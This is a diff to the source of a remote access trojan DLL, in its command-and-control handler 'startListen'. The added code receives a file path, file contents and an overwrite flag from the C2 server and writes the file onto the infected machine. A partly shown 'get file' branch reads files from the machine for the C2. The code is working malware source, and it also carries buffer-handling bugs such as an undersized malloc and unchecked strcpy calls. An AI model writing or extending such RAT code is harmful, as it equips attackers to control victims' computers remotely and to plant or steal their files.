@@ -3,6 +3,8 @@
 // RAT-Dll-Connect.cpp : This file contains functionality for handling our connection back to our C2 server
 
 #include "RAT-Dll-Connect.h"
+#include "RAT-Dll-GetFile.h"
+#include "RAT-Dll-PutFile.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -98,33 +100,87 @@ INT startListen()
 
     // Receive from client until the peer shuts down the connection
         // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
-        // TODO: Separate each conditional into its own function... probably in its respective cpp file 
+        // TODO: Separate each conditional into its own function... probably in its respective cpp file. Have master handler in another function in this cpp file 
     do
     {
         OutputDebugStringA("RAT-Dll::startListen - Connection from C2 recieved! Waiting for command... \n");
         status = recv(clientSock, recvBuf, recvBufLen, 0);
         if (status > 0)
         {
-             // C2 told us to put a file so lets get the file contents first 
+             // C2 told us to put a file so lets get the file path first 
             if (strcmp((const char*)&recvBuf, PUT) == 0)
             {
                 // Get the file path
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
                 if (status == SOCKET_ERROR)
-                {
-                    // error out instead here....
-
-
+                {               
+                    // TODO: have a function call to send back failure? Request a resend?
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file path) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue; // keep trying to do things until we disconnect or receive a cleanup message
                 }
 
-
+                // We got the file path 
                 sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", recvBuf);
                 OutputDebugStringA(msgBuf);
 
+                // Assign file path to separate buffer 
+                CHAR filePathBuffer[DEFAULT_BUF_LEN];
+                strcpy(filePathBuffer, recvBuf);
+
                 // Get the actual file bytes
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file bytes) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue;
+                }
 
+                CONST UINT64 fileBytesSize = strlen(recvBuf);
 
+                // Just a char buffer containing our bytes 
+                char* fileBytes = (char*)malloc(sizeof(char) * fileBytesSize);
+                if (fileBytes == NULL)
+                {
+                    OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
+                    status = FAILURE;
+                    goto cleanup;
+                }
+
+                strcpy(fileBytes, recvBuf);
+
+                // Get our overwrite value 
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (overwrite) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue;
+                }
+
+                // this feels weird
+                BOOL overwrite = *recvBuf;
+
+                status = performPutFile(filePathBuffer, fileBytes, overwrite);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performPutFile %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+
+                // Send back our success code 
+                status = send(clientSock, "SUCCESS", 7, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    status = WSAGetLastError();
+                    goto cleanup;
+                }
+
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully put file!\n");
             }
 
             // C2 told us to get a file so lets get the file path first 
@@ -132,12 +188,12 @@ INT startListen()
              {
                 // Receive our file path 
                  status = recv(clientSock, recvBuf, recvBufLen, 0);
-                 if (status != SOCKET_ERROR)
+                 if (status != SOCKET_ERROR) // TODO: change this to match conditional like above; check for failure and fail out otherwise continue 
                  {
                      sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing get file on %s...\n", recvBuf);
                      OutputDebugStringA(msgBuf);
 
-                     char** fileBytes  =(char**)malloc(sizeof(char*));
+                     char** fileBytes = (char**)malloc(sizeof(char*));
                      if (fileBytes == NULL)
                      {
                          OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
